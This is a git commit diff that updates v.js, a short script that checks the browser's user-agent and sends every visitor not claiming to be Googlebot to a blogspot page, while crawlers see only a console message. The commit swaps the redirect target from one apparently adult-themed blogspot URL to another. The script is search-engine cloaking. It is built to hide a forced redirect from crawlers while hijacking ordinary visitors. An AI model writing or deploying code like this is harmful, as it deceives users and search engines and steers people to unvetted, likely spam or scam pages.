518f643a6a9bc9b587b55c68197ff7c47fcd4105
xnxxxxnx <kazariah.gorder@mailmagnet.co>
2026-09-03 22:56:16 +0600

    Update v.js

--- v.js
+++ v.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://best-dude-for-adults.blogspot.com/2026/08/all-video.html";
+  window.location.href = "https://joy-vole-babar-joy.blogspot.com/2026/09/bhole-baba.html";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
